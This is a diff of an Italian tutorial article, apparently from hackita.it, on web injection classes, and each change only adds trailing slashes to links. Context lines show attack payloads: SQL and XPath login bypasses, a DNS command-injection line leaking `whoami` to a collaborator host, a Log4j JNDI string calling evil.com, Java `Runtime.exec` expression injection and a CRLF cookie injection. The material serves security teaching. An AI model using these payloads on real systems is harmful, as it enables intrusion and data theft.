@@ -96,15 +96,15 @@ SELECT * FROM users WHERE email = 'admin@mail.com'--' AND password = 'qualsiasi'
 
 **Varianti:**
 
-* **SQL Injection Classica** — errore visibile, output diretto nella response → [sql-injection-classica](https://hackita.it/articoli/sql-injection-classica)
-* **Blind SQL Injection** — nessun output, inferisci i dati da comportamenti (true/false, timing) → [blind-sql-injection](https://hackita.it/articoli/blind-sql-injection)
-* **Time-Based SQL Injection** — usi `SLEEP()` o `WAITFOR DELAY` per estrarre dati bit per bit dai tempi di risposta → [time-based-sql-injection](https://hackita.it/articoli/time-based-sql-injection)
-* **SQL Injection su API REST** — l'injection arriva in parametri JSON invece che nei form tradizionali → [sql-injection-api-rest](https://hackita.it/articoli/sql-injection-api-rest)
-* **SQL Injection su ORM** — anche i query builder come Eloquent o SQLAlchemy possono essere vulnerabili se usati male → [sql-injection-orm](https://hackita.it/articoli/sql-injection-orm)
+* **SQL Injection Classica** — errore visibile, output diretto nella response → [sql-injection-classica](https://hackita.it/articoli/sql-injection-classica/)
+* **Blind SQL Injection** — nessun output, inferisci i dati da comportamenti (true/false, timing) → [blind-sql-injection](https://hackita.it/articoli/blind-sql-injection/)
+* **Time-Based SQL Injection** — usi `SLEEP()` o `WAITFOR DELAY` per estrarre dati bit per bit dai tempi di risposta → [time-based-sql-injection](https://hackita.it/articoli/time-based-sql-injection/)
+* **SQL Injection su API REST** — l'injection arriva in parametri JSON invece che nei form tradizionali → [sql-injection-api-rest](https://hackita.it/articoli/sql-injection-api-rest/)
+* **SQL Injection su ORM** — anche i query builder come Eloquent o SQLAlchemy possono essere vulnerabili se usati male → [sql-injection-orm](https://hackita.it/articoli/sql-injection-orm/)
 
-**Target comune: MSSQL** — se trovi la porta 1433 aperta durante la ricognizione, MSSQL è spesso un vettore privilegiato per SQL injection con escalation a xp\_cmdshell (RCE) → [porta-1433-mssql](https://hackita.it/articoli/porta-1433-mssql)
+**Target comune: MSSQL** — se trovi la porta 1433 aperta durante la ricognizione, MSSQL è spesso un vettore privilegiato per SQL injection con escalation a xp\_cmdshell (RCE) → [porta-1433-mssql](https://hackita.it/articoli/porta-1433-mssql/)
 
-→ **Guida completa:** [sql-injection](https://hackita.it/articoli/sql-injection)
+→ **Guida completa:** [sql-injection](https://hackita.it/articoli/sql-injection/)
 
 ***
 
@@ -150,7 +150,7 @@ $() →  command substitution
 ; nslookup $(whoami).COLLABORATOR.burpcollaborator.net
 ```
 
-→ **Guida completa:** [command-injection](https://hackita.it/articoli/command-injection) — [os-command-injection](https://hackita.it/articoli/os-command-injection)
+→ **Guida completa:** [command-injection](https://hackita.it/articoli/command-injection/) — [os-command-injection](https://hackita.it/articoli/os-command-injection/)
 
 ***
 
@@ -178,7 +178,7 @@ UTENTE: *
 # → Lista tutti gli utenti
 ```
 
-→ **Guida completa:** [ldap-injection](https://hackita.it/articoli/ldap-injection)
+→ **Guida completa:** [ldap-injection](https://hackita.it/articoli/ldap-injection/)
 
 ***
 
@@ -206,7 +206,7 @@ UTENTE: *
 
 **Dove cercare:** upload di file XML, endpoint SOAP, SVG upload, import di dati via XML, qualsiasi campo che accetti XML o trasformi il body in XML internamente.
 
-→ **Guida completa:** [xxe](https://hackita.it/articoli/xxe) — [xxe-injection](https://hackita.it/articoli/xxe-injection)
+→ **Guida completa:** [xxe](https://hackita.it/articoli/xxe/) — [xxe-injection](https://hackita.it/articoli/xxe-injection/)
 
 ***
 
@@ -239,7 +239,7 @@ mario' or '1'='1
 x' or name()='username' or 'x'='y
 ```
 
-→ **Guida completa:** [xpath-injection](https://hackita.it/articoli/xpath-injection)
+→ **Guida completa:** [xpath-injection](https://hackita.it/articoli/xpath-injection/)
 
 ***
 
@@ -279,13 +279,13 @@ ${7*7}       → 49      → Freemarker, Velocity
 <%= 7*7 %>   → 49      → ERB (Ruby)
 ```
 
-→ **Guida completa:** [ssti-server-side-template-injection](https://hackita.it/articoli/ssti-server-side-template-injection)
+→ **Guida completa:** [ssti-server-side-template-injection](https://hackita.it/articoli/ssti-server-side-template-injection/)
 
 **Guide per motore specifico:**
 
-* [jinja2-ssti-rce](https://hackita.it/articoli/jinja2-ssti-rce) · [twig-ssti-rce](https://hackita.it/articoli/twig-ssti-rce) · [freemarker-ssti-rce](https://hackita.it/articoli/freemarker-ssti-rce)
-* [velocity-ssti-rce](https://hackita.it/articoli/velocity-ssti-rce) · [erb-ssti-rce](https://hackita.it/articoli/erb-ssti-rce) · [pebble-ssti-rce](https://hackita.it/articoli/pebble-ssti-rce)
-* [thymeleaf-ssti-rce](https://hackita.it/articoli/thymeleaf-ssti-rce) · [smarty-ssti-rce](https://hackita.it/articoli/smarty-ssti-rce) · [mako-ssti-rce](https://hackita.it/articoli/mako-ssti-rce)
+* [jinja2-ssti-rce](https://hackita.it/articoli/jinja2-ssti-rce/) · [twig-ssti-rce](https://hackita.it/articoli/twig-ssti-rce/) · [freemarker-ssti-rce](https://hackita.it/articoli/freemarker-ssti-rce/)
+* [velocity-ssti-rce](https://hackita.it/articoli/velocity-ssti-rce/) · [erb-ssti-rce](https://hackita.it/articoli/erb-ssti-rce/) · [pebble-ssti-rce](https://hackita.it/articoli/pebble-ssti-rce/)
+* [thymeleaf-ssti-rce](https://hackita.it/articoli/thymeleaf-ssti-rce/) · [smarty-ssti-rce](https://hackita.it/articoli/smarty-ssti-rce/) · [mako-ssti-rce](https://hackita.it/articoli/mako-ssti-rce/)
 
 ***
 
@@ -307,7 +307,7 @@ T(java.lang.Runtime).getRuntime().exec('id')
 T(java.lang.ProcessBuilder).new(new String[]{'id'}).start()
 ```
 
-→ **Guida completa:** [expression-language-injection](https://hackita.it/articoli/expression-language-injection)
+→ **Guida completa:** [expression-language-injection](https://hackita.it/articoli/expression-language-injection/)
 
 ***
 
@@ -332,7 +332,7 @@ Location: https://safe.com
 Set-Cookie: session=ATTACKER_SESSION   ← iniettato dall'attaccante
 ```
 
-→ **Guida completa:** [crlf-injection](https://hackita.it/articoli/crlf-injection) — [http-header-injection](https://hackita.it/articoli/http-header-injection)
+→ **Guida completa:** [crlf-injection](https://hackita.it/articoli/crlf-injection/) — [http-header-injection](https://hackita.it/articoli/http-header-injection/)
 
 ***
 
@@ -355,7 +355,7 @@ username = "${jndi:ldap://evil.com/a}"
 # → Log4j contatta evil.com → carica un payload Java → RCE
 ```
 
-→ **Guida completa:** [log-injection](https://hackita.it/articoli/log-injection)
+→ **Guida completa:** [log-injection](https://hackita.it/articoli/log-injection/)
 
 ***
 
@@ -380,7 +380,7 @@ mutation {
 { __schema { types { name fields { name } } } }
 ```
 
-→ **Guida completa:** [graphql-exploitation](https://hackita.it/articoli/graphql-exploitation)
+→ **Guida completa:** [graphql-exploitation](https://hackita.it/articoli/graphql-exploitation/)
 
 ***
 
@@ -638,17 +638,17 @@ render_template_string(f"Ciao {user_input}")    # NO
 
 | Tipo                   | Guida dedicata                                                                                                                                                                                                                                                                                                                                                                      |
 | ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| SQL Injection          | [sql-injection](https://hackita.it/articoli/sql-injection) · [classica](https://hackita.it/articoli/sql-injection-classica) · [blind](https://hackita.it/articoli/blind-sql-injection) · [time-based](https://hackita.it/articoli/time-based-sql-injection) · [API REST](https://hackita.it/articoli/sql-injection-api-rest) · [ORM](https://hackita.it/articoli/sql-injection-orm) |
-| Command Injection      | [command-injection](https://hackita.it/articoli/command-injection) · [os-command-injection](https://hackita.it/articoli/os-command-injection)                                                                                                                                                                                                                                       |
-| LDAP Injection         | [ldap-injection](https://hackita.it/articoli/ldap-injection)                                                                                                                                                                                                                                                                                                                        |
-| XXE                    | [xxe](https://hackita.it/articoli/xxe) · [xxe-injection](https://hackita.it/articoli/xxe-injection)                                                                                                                                                                                                                                                                                 |
-| XPath Injection        | [xpath-injection](https://hackita.it/articoli/xpath-injection)                                                                                                                                                                                                                                                                                                                      |
-| SSTI                   | [ssti-server-side-template-injection](https://hackita.it/articoli/ssti-server-side-template-injection)                                                                                                                                                                                                                                                                              |
-| EL Injection           | [expression-language-injection](https://hackita.it/articoli/expression-language-injection)                                                                                                                                                                                                                                                                                          |
-| CRLF / Header          | [crlf-injection](https://hackita.it/articoli/crlf-injection) · [http-header-injection](https://hackita.it/articoli/http-header-injection)                                                                                                                                                                                                                                           |
-| Log Injection          | [log-injection](https://hackita.it/articoli/log-injection)                                                                                                                                                                                                                                                                                                                          |
-| GraphQL                | [graphql-exploitation](https://hackita.it/articoli/graphql-exploitation)                                                                                                                                                                                                                                                                                                            |
-| RCE (risultato finale) | [rce](https://hackita.it/articoli/rce)                                                                                                                                                                                                                                                                                                                                              |
+| SQL Injection          | [sql-injection](https://hackita.it/articoli/sql-injection/) · [classica](https://hackita.it/articoli/sql-injection-classica/) · [blind](https://hackita.it/articoli/blind-sql-injection/) · [time-based](https://hackita.it/articoli/time-based-sql-injection/) · [API REST](https://hackita.it/articoli/sql-injection-api-rest/) · [ORM](https://hackita.it/articoli/sql-injection-orm/) |
+| Command Injection      | [command-injection](https://hackita.it/articoli/command-injection/) · [os-command-injection](https://hackita.it/articoli/os-command-injection/)                                                                                                                                                                                                                                       |
+| LDAP Injection         | [ldap-injection](https://hackita.it/articoli/ldap-injection/)                                                                                                                                                                                                                                                                                                                        |
+| XXE                    | [xxe](https://hackita.it/articoli/xxe/) · [xxe-injection](https://hackita.it/articoli/xxe-injection/)                                                                                                                                                                                                                                                                                 |
+| XPath Injection        | [xpath-injection](https://hackita.it/articoli/xpath-injection/)                                                                                                                                                                                                                                                                                                                      |
+| SSTI                   | [ssti-server-side-template-injection](https://hackita.it/articoli/ssti-server-side-template-injection/)                                                                                                                                                                                                                                                                              |
+| EL Injection           | [expression-language-injection](https://hackita.it/articoli/expression-language-injection/)                                                                                                                                                                                                                                                                                          |
+| CRLF / Header          | [crlf-injection](https://hackita.it/articoli/crlf-injection/) · [http-header-injection](https://hackita.it/articoli/http-header-injection/)                                                                                                                                                                                                                                           |
+| Log Injection          | [log-injection](https://hackita.it/articoli/log-injection/)                                                                                                                                                                                                                                                                                                                          |
+| GraphQL                | [graphql-exploitation](https://hackita.it/articoli/graphql-exploitation/)                                                                                                                                                                                                                                                                                                            |
+| RCE (risultato finale) | [rce](https://hackita.it/articoli/rce/)                                                                                                                                                                                                                                                                                                                                              |
 
 ***
 
